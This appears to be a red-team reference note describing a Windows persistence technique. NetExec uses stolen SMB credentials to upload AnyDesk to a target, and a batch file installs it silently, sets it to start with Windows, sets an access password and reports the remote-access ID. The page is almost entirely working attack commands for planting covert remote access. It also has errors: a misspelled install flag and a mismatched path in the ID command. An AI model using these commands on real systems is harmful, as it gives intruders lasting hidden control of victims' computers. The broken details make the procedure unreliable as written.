---
author(s):
  - Userware
tags:
  - post-exploitation
  - maintaining-access
  - persistence
  - third-party
  - staying-off-the-land
  - windows
---
# NetExec

## 01 - Upload AnyDesk

```
$ netexec smb <IP> -u "<username>" -p "<password>" [-d <domain> | --local-auth] --put-file anydesk.exe \\Users\\<username>\\AppData\\Local\\Temp\\anydesk.exe
```

## 02 - Install AnyDesk

```
$ cat anydesk.bat
md %LOCALAPPDATA%\AnyDesk
%LOCALAPPDATA%\Temp\anydesk.exe --start-with-win --slient --install %LOCALAPPDATA%\AnyDesk
del %LOCALAPPDATA%\Temp\anydesk.exe
echo <password> | %LOCALAPPDATA%\AnyDesk\AnyDesk.exe --set-password
for /f "delims=" %i in ('%appdata%\AppData\Local\AnyDesk\AnyDesk.exe --get-id') do echo %i

$ netexec smb <IP> -u "<username>" -p "<password>" [-d <domain> | --local-auth] -x anydesk.bat
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x07 - Maintaining Access/Persistence/Desktop/Windows/Host Persistence/Remote Login/Third Party/Remote Monitoring and Management/AnyDesk/Malware Development/Scripting]]